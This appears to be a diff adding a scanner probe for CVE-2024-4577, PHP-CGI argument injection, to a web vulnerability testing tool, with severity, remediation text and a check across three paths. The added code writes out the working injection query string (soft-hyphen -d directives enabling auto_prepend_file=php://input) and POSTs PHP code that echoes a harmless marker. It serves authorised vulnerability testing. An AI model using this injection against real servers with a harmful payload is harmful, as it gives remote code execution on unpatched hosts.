@@ -311,3 +311,38 @@ class SSTI(WebProbe):
                                    % (tpl, expected))]
         return [AttemptRec("template-eval", self.objective, [last] if last else [], False, 0.0, "",
                            "No server-side template evaluation observed.")]
+
+
+@register
+class PHPCGIArgInjection(WebProbe):
+    """CVE-2024-4577 — PHP-CGI argument injection → RCE (PHP on Windows/CGI).
+    Verifies with a BENIGN payload that only echoes a random marker (no harm)."""
+    id = "cve_2024_4577"
+    name = "PHP-CGI Argument Injection (CVE-2024-4577)"
+    owasp = "A06"
+    mitre = "T1190"
+    severity = "critical"
+    objective = "Confirm CVE-2024-4577 PHP-CGI argument injection leads to remote code execution."
+    description = ("Tests the PHP-CGI argument-injection RCE (CVE-2024-4577): a soft-hyphen (%AD) "
+                   "smuggles -d directives that enable auto_prepend_file=php://input, executing a "
+                   "posted PHP payload.")
+    remediation = ("Upgrade PHP to a patched release (8.1.29/8.2.20/8.3.8+); stop running PHP in CGI "
+                   "mode; apply the vendor advisory and WAF rules for the %AD pattern.")
+
+    def execute(self, base_url, http):
+        import random
+        marker = "DAGGER-PHPCGI-%d" % random.randint(10000, 99999)
+        php = "<?php echo '%s'; ?>" % marker
+        q = "%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input"
+        s = None
+        for path in ("/index.php?" + q, "/?" + q, "/php-cgi/php-cgi.exe?" + q):
+            url = urljoin(base_url, path)
+            s, r = _req(http, "POST", url, "CVE-2024-4577: inject -d directives, POST a PHP echo payload",
+                        content=php.encode())
+            text = r.text if r is not None else ""
+            if marker in text:
+                return [AttemptRec("php-cgi-arg-injection", self.objective, [s], True, 1.0, marker,
+                                   "CVE-2024-4577 confirmed: the injected PHP executed server-side "
+                                   "(echoed %s) — remote code execution." % marker)]
+        return [AttemptRec("php-cgi-arg-injection", self.objective, [s] if s else [], False, 0.0, "",
+                           "Not exploitable (not PHP-CGI, or already patched).")]
